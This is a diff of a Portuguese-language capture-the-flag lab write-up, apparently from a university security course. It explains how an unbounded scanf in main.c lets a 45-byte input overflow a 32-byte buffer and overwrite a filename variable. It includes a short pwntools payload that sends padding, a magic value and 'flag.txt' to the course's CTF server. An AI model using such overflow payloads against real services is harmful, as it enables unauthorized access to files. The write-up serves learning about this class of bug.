@@ -92,11 +92,28 @@ Resultando em:
 
 ### DESAFIO 2
 
-Para este desafio efetuamos os mesmos passos que para o primeiro, no entanto adicionamos pwn.p32(pxfefc2324) entre b'A'*32 e b'flag.txt'. Assim conseguimos obter a flag
+Pudemos notar que o serviço **ctf-fsi.fe.up.pt:4000** a correr o programa realizava um printf do input do utilizador e decidimos nos aproveitar dessa vulnerabilidade para nos auxiliar a fazer explorar um situação de buffer overflow.
 
+Com os ficheiros fornecidos, depois de uma análise ao código do main.c, pudemos notar que o scanf() permite-nos ler até 13 bytes além do limite da variável buffer com 32 bytes.
 
+**main.c**
+```c
+char meme_file[9] = "mem.txt\0\0";
+char val[4] = "\xef\xbe\xad\xde";
+char buffer[32];
+...
+scanf("%45s", &buffer);
+```
 
+Com isso, assumindo que na stack temos a váriavel *meme_file* e sabemos que ela está a ser usada pelo programa para abrir um ficheiro, com a ajuda do exploit *exploit-example.py* que interaje com o serviço. Aproveitamo-nos desse 'oversight' do scanf e mandamos uma payload de 32 bytes + o valor 0xfefc2324 em Little Endian Byte Order + o nome do ficheiro que pretendemos lêr.
 
+```python
+from pwn import *
+...
+r.recvuntil(b":")
+payload = b"A" * 32 + p32(0xfefc2324) + b"flag.txt"
+r.sendline(payload)
+```
 
-
-
+Resultando em:
+![](docs/images/Captura_de_ecrã_2023-10-27_235209.png)
